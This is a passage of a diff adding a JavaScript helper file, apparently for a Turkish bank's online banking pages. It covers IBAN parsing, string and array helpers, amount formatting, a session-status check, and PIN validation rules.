+    if (iban.length >= 20 && iban.toLocaleUpperCase().indexOf('TR') == 0)
+        return true;
+    else
+        return false;
+}
+
+String.prototype.trimAll = function () {
+    var sString = this;
+    while (sString.substring(0, 1) == ' ') {
+        sString = sString.substring(1, sString.length);
+    }
+    while (sString.substring(sString.length - 1, sString.length) == ' ') {
+        sString = sString.substring(0, sString.length - 1);
+    }
+    return sString;
+};
+
+function ResolveIban(iban) {
+
+    var result = [];
+    result[0] = iban.substr(4, 5);
+    var hesapno = iban.substr(10);
+    if (result[0] == 10) {
+        result[1] = hesapno.substr(0, 4);
+        result[2] = hesapno.substr(4, 8);
+        result[3] = hesapno.substr(12, 4);
+    }
+
+    return result;
+}
+
+function IsZiraatBankIban(iban) {
+    var resolvedIban = ResolveIban(iban);
+    var result = false;
+
+    if (resolvedIban != null && resolvedIban.length > 0 && parseFloat(resolvedIban[0]) == 10)
+        result = true;
+
+    return result;
+}
+
+Array.prototype.Contains = function (a) {
+    var array = this;
+    var result = false;
+
+    if (array != null && array != undefined && array.length > 0 && a != null && a != undefined) {
+        $.each(array, function (i, item) {
+            if (item != null && item != undefined && item == a) {
+                result = true;
+                return false;
+            }
+        });
+    }
+
+    return result;
+};
+
+Array.prototype.Add = function (item) {
+    var array = this;
+    array[array.length] = item;
+};
+
+Array.prototype.Clear = function () {
+    var array = this;
+
+    if (array != null && array != undefined && array.length > 0) {
+        $.each(array, function (i, item) {
+            array[i] = undefined;
+        });
+    }
+};
+
+
+String.prototype.turkishToUpper = function () {
+    var string = this;
+    var letters = { "i": "İ", "ş": "Ş", "ğ": "Ğ", "ü": "Ü", "ö": "Ö", "ç": "Ç", "ı": "I" };
+    string = string.replace(/(([iışğüçö]))+/g, function (letter) { return letters[letter]; })
+    return string.toUpperCase();
+}
+
+String.prototype.turkishToLower = function () {
+    var string = this;
+    var letters = { "İ": "i", "I": "ı", "Ş": "ş", "Ğ": "ğ", "Ü": "ü", "Ö": "ö", "Ç": "ç" };
+    string = string.replace(/(([İIŞĞÜÇÖ]))+/g, function (letter) { return letters[letter]; })
+    return string.toLowerCase();
+}
+
+Number.prototype.fmAmount = function (decPlaces, thouSeparator, decSeparator) {
+    var n = this,
+            decPlaces = isNaN(decPlaces = Math.abs(decPlaces)) ? 2 : decPlaces,
+            decSeparator = decSeparator == undefined ? "," : decSeparator,
+            thouSeparator = thouSeparator == undefined ? "." : thouSeparator,
+            sign = n < 0 ? "-" : "",
+            i = parseInt(n = Math.abs(+n || 0).toFixed(decPlaces)) + "",
+            j = (j = i.length) > 3 ? j % 3 : 0;
+    return sign + (j ? i.substr(0, j) + thouSeparator : "") + i.substr(j).replace(/(\d{3})(?=\d)/g, "$1" + thouSeparator) + (decPlaces ? decSeparator + Math.abs(n - i).toFixed(decPlaces).slice(2) : "");
+};
+
+function InArray(value, array) {
+
+    var result = $.inArray(value, array);
+
+    if (result == -1)
+        return false;
+    else
+        return true;
+}
+
+
+function CheckForZiraatInvestmentLoginStatus(CallBackFunction) {
+
+    var paramaters = {};
+    paramaters.t = 1;
+    $.getJSON(relativePath + 'Transactions/Login/LoginStatus.ashx', paramaters, function (Response) {
+        CallBackFunction(Response);
+    });
+
+}
+
+function CheckForZiraatInvestmentLoginStatusCallBack(Response) {
+
+    isResponseFetched = true;
+    reTryCount -= 1;
+    if (Response != null && Response != undefined && Response.IsSuceess && Response.IsSessionEnd) {
+        isZiraatInvestmentSessionEnd = true;
+        if (Response.ResetReTryCount) reTryCount = 0;
+    }
+
+    if (!isZiraatInvestmentSessionEnd && reTryCount > 0) resetCounter();  //g_iCount = timerCounter;
+
+}
+
+function StartLoggOff() {
+    CloseChatFrame();
+    top.frames[0].isLoggingOff = true;
+    top.isLogOffActionStarted = true;
+    setTimeout(function () {
+        top.location.href = relativePath + "navigationcontroller.aspx?page=Logoff&r=" + Math.random(0, 20000);
+    }, 1000);
+    
+}
+
+function UpdateLimitTable() {
+    $(".limit-table table tr.limit-amount-row td").each(function () {
+        var limitValue = parseFloat($(this).data("value"));
+        if (limitValue != undefined && !isNaN(limitValue) && limitValue < 0) {
+            $(this).text("0,00");
+        }
+    });
+}
+function ParseFloatAmountValue(value) {
+    var amount = value;
+    var amountValue = 0;
+    if (amount != undefined) {
+        amount = amount.toString();
+        amount = amount.replace(/\./g, '');
+        amount = amount.replace(/\,/g, '.');
+        if (!isNaN(amount)) {
+            amountValue = amount;
+        }
+        else {
+            amountValue = 0;
+        }
+    } else {
+        amountValue = 0;
+    }
+    return parseFloat(amountValue);
+}
+
+String.prototype.ReplaceAll = function (oldText, newText) {
+    var text = this;
+    while (text.indexOf(oldText) > -1) {
+        text = text.replace(oldText, newText);
+    }
+    return text;
+}
+
+String.prototype.HasAnySpace = function () {
+
+    var text = this;
+    var hasSpace = false;
+
+    if (text != null && text != undefined && text != '') {
+        if (/\s/.test(text))
+            hasSpace = true;
+    }
+
+    return hasSpace;
+}
+String.prototype.AddUrlParameter = function (param, value) {
+    var url = this;
+    var val = new RegExp('(\\?|\\&)' + param + '=.*?(?=(&|$))'),
+            qstring = /\?.+$/;
+
+    if (val.test(url)) {
+        return url.replace(val, '$1' + param + '=' + value);
+    }
+    else if (qstring.test(url)) {
+        return url + '&' + param + '=' + value;
+    }
+    else {
+        return url + '?' + param + '=' + value;
+    }
+}
+
+String.prototype.AddRandomQueryParameter = function () {
+    var url = this;
+    return url.AddUrlParameter("r", Math.random(0, 20000));
+}
+
+String.prototype.Format = function () {
+    var content = this;
+    $.each(arguments, function (i, item) {
+        var replacement = '{' + i + '}';
+        content = content.replace(replacement, item);
+    });
+
+    return content;
+};
+
+$(function () {
+    $('.isAlphaNumericForPin').keypress(function (event) {
+        return isAlphaNumericForPin(event);
+    });
+});
+
+function isAlphaNumericForPin(evt) {
+    var allowedCharCodes = [8, 9, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 305, 287, 286, 252, 220, 351, 350, 304, 231, 199, 246, 214];
+    var charCode = GetWhichCode(evt);
+    return allowedCharCodes.Contains(charCode);
+}
+
+function hasConsecutiveCharacter(inputText) {
+    for (i = 0; i < inputText.length - 1; i++) {
+        var input = getCode(inputText.charAt(i));
+        var inputPrevious = getCode(inputText.charAt(i + 1));
+        var inputAfterNext = getCode(inputText.charAt(i + 2));
+        if (input == (inputPrevious - 1) && inputPrevious == (((inputAfterNext - 1)))) {
+            return true;
+        }
+    }
+}
+
+function getCode(character) {
+    return characterAlphabetValues[characterAlphabet.indexOf(character)];
+}
+
+function CheckAlphaNumericPinEntry(element) {
+    
+}
+
+function CheckAlphaNumericCurrentPinEntry(element) {
+    var inputText = $(element).val();
+    var rangeMinLength = $(element).attr("range-min-length");
+    var rangeMaxLength = $(element).attr("range-max-length");
+
+    if (inputText.length < rangeMinLength || inputText.length > rangeMaxLength) {
+        return $(element).attr("pin-validation-message-current-pin-length");
+    }
+}
+
+function CheckDynamicRegex(element) {
+    var input = $(element).val();
+    var regexMatchCount = $(element).attr("regex-match-count");
+    for (var i = 0; i < regexMatchCount; i++) {
+        var currentRegex = $(element).attr("regex-match" + i);
+        if (!input.match(currentRegex)) {
+            return $(element).attr("regex-match-message" + i);
+        }
+    }
+
+    var regexNotCount = $(element).attr("regex-not-count");
+    for (var i = 0; i < regexNotCount; i++) {
+        var currentRegex = $(element).attr("regex-not" + i);
+        if (input.match(currentRegex)) {
+            return $(element).attr("regex-not-message" + i);
+        }
+    }
+}
+function CheckAlphaNumericNewPinEntry(element) {
+    var inputText = $(element).val();
+    var requiredLength = $(element).attr("required-length");
+    
+    var currentDate = new Date();
+    var currentYear = currentDate.getFullYear();
+
+    if (inputText.length != requiredLength) {
+        return $(element).attr("pin-validation-message-new-pin-length");
+    }
+
+    if (hasConsecutiveCharacter(inputText.toLowerCase())) {
+        return $(element).attr("pin-validation-message-new-pin-consecutive");
+    }
+
+    if (!regexHasDigit.test(inputText)) {
+        return $(element).attr("pin-validation-message-new-pin-atleastonedigit");
+    }
+
+    if (regexHasRepeatedCharacter.test(inputText)) {
+        return $(element).attr("pin-validation-message-new-pin-repeatedchars");
+    }
+    if (inputText.indexOf("0") == 0) {
+        return $(element).attr("pin-validation-message-new-pin-startswithzero");
+    }
+
+    if (regexBirthDayYear.test(inputText)) {
+        var yearMatches = getAllMatches(regexBirthDayYear, inputText);
+        var birthDayYearFound = false;
+        yearMatches.forEach(function (e) {
+            var iYear = parseInt(e);
+            if (iYear >= birthDayMinYear && iYear <= currentYear) {
+                birthDayYearFound = true;
+            }
+        });
+        if (birthDayYearFound) {
+            return $(element).attr("pin-validation-message-new-pin-birthday");
+        }
+    }
+
+
+}
+
+function CloseChatFrame() {
+    try{
+        top.document.getElementById('chatFrame').contentWindow.CloseChat();
+    } catch (err) {
+        ;
+    }
+}
+window['hasFormChange'] = false;
+
+$(document).ready(function () {
+    
+    $("body").click(function () {
+        $("#DvChat").remove();
+    });
+
+    $('.acc-button').live('click', function () {
+        if ($(this).hasClass('on')) {
+            $(this).removeClass('on').next('.acc-content').slideUp(600, function () {
+                setItemsScroll();
+            });
+        } else {
+            $('.acc-button.on').not(this).removeClass('on').next('.acc-content').slideUp(600);
+            $(this).addClass('on').next('.acc-content').slideDown(600, function () {
+                setItemsScroll();
+            });
+        }
+    });
+
+    $('a.menu-sub-link, .menu-add a, a.sub-link, .sub-left a, .header-top-bar a:not(.tb-section1)').click(function (e) {
+        checkChanges(e, this);
+});
+
+    if (typeof OpenTransactionLightBox !== 'undefined' && $.isFunction(OpenTransactionLightBox)) {
+        var oldOpenTransactionLightBox = OpenTransactionLightBox;
+
+        OpenTransactionLightBox = function (url, hasCloseButton) {
+            
+            if (typeof event !== 'undefined' && $(event.target).parent('a:first').is('a.menu-sub-link, .menu-add a, a.sub-link, .header-top-bar a:not(.tb-section1)') && hasFormChange === true) {
+                return;
+            }
+            oldOpenTransactionLightBox(url, hasCloseButton);
+        }
+    }
+
+});
+
+function setHasFormChanges(win, hasChange) {
+    if (!win || !win.frames)
+        return;
+    for (var i = 0; i < win.frames.length; i++) {
+        win.frames[i].window['hasFormChange'] = hasChange;
+        setHasFormChanges(win.frames[i].window, hasChange);
+    }
+}
+
+function checkChanges(e, sender) {
+    if (hasFormChange === true) {
+        e.preventDefault();
+        is_DefaultSubmit = false;
+        showConfirm('Kaydetmediğiniz tüm değişiklikleri iptal etmek istediğinize emin misiniz?', function () {
+            setHasFormChanges(top.window, false);
+            if ($(sender).attr('href').indexOf('__doPo') > -1) {
+                location.href = $(sender).attr('href');
+            }
+            else {
+                $(sender).click();
+            }
+            CloseAlertLightBox();
+            setTimeout(function () {
+                dummyLoading();
+            }, 650);
+});
+    }
+}
+function closeChildGenericLightBox() {
+    setTimeout(function () {
+        dummyLoading();
+        $('.light-box-closer').trigger('click');
+        $('[id*="GenericLightBox"]', $(top.frames[0].document)).find('.overlay-close').click();
+    }, 100);
+}
+if (!Array.prototype.filter) {
+    Array.prototype.filter = function (fun /*, thisp */) {
+        "use strict";
+
+        if (this === void 0 || this === null)
+            throw new TypeError();
+
+        var t = Object(this);
+        var len = t.length >>> 0;
+        if (typeof fun !== "function")
+            throw new TypeError();
+
+        var res = [];
+        var thisp = arguments[1];
+        for (var i = 0; i < len; i++) {
+            if (i in t) {
+                var val = t[i]; // in case fun mutates this
+                if (fun.call(thisp, val, i, t))
+                    res.push(val);
+            }
+        }
+
+        return res;
+    };
+}
+
+$(document).ready(function () {
+    $(".pin-entry").bind('contextmenu', function (e) {
+        return false;
+    });
+});
+
+String.prototype.matchAll = function (regexp) {
+    var matches = [];
+    this.replace(regexp, function () {
+        var arr = ([]).slice.call(arguments, 0);
+        var extras = arr.splice(-2);
+        arr.index = extras[0];
+        arr.input = extras[1];
+        matches.push(arr);
+    });
+    return matches.length ? matches : null;
+};
+
+function getAllMatches(regex, text) {
+
+    var textCopy = text;
+    var res = [];
+    var match = null;
+    while (match = regex.exec(textCopy)) {
+        res.push(match[0]);
+        textCopy = textCopy.substr(match.index + 1);
+    }
+
+    return res;
+}
+
+
+function StartAskForAgreementLightBoxabc() {
+    $('.lb-wrapper-box-wrapper').css('visibility', 'hidden');
+    $('#ctl00_AskForAgreementLightBox').find('.light-box-closer').addClass("displayNone");
+}
